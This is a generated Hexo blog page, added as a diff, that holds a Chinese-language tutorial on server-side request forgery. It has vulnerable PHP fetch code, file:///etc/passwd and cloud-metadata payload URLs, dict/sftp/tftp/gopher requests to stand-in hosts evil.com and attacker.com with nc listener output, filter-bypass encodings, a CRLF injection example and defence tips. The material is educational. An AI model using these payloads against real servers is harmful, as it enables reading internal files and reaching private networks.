@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SSRF一、SSRF是什么？SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  二、SSRF漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/05/20/Web/SSRF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SSRF一、SSRF是什么？SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  二、SSRF漏洞原理SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/.com//image-20250520025641-k2sfyci.png">
+<meta property="og:image" content="http://example.com/.com//image-20250520025700-u9pjgmi.png">
+<meta property="og:image" content="http://example.com/.com//image-20250520025709-vdxc2ye.png">
+<meta property="og:image" content="http://example.com/.com//image-20250520025722-dq5eksz.png">
+<meta property="og:image" content="http://example.com/.com//image-20250520030023-ukm1uls.png">
+<meta property="article:published_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:modified_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//image-20250520025641-k2sfyci.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/SSRF/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<hr>
+<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
+<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
+<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<hr>
+<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
+<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
+<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
+<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
+<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
+<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
+</blockquote>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
+<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
+<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
+<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
+<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<blockquote>
+<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
+</blockquote>
+<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
+<hr>
+<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
+<p><strong>1、file_get_contents:</strong></p>
+<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、sockopen():</strong></p>
+<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、curl_exec():</strong></p>
+<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>1、file</strong></p>
+<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+</blockquote>
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<p><strong>2、dict</strong></p>
+<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>3、sftp</strong></p>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
+<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
+<hr>
+<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。.</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
+<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
+<hr>
+<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
+<p>一、常见的绕过方式</p>
+<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>2.采用短网址绕过</strong></p>
+<blockquote>
+<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
+</blockquote>
+<p><strong>3.采用进制转换</strong></p>
+<blockquote>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
+<p><strong>4.利用特殊域名</strong></p>
+<blockquote>
+<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
+</blockquote>
+<p><strong>5.利用[::]</strong></p>
+<blockquote>
+<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
+</blockquote>
+<p><strong>6.利用句号</strong></p>
+<blockquote>
+<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+<p><strong>7、CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
+
+<p><strong>8.利用封闭的字母数字</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<p>二、常见限制</p>
+<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+</blockquote>
+<hr>
+<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
+<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmawal1ix0010bo7k7tbh8n65" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" 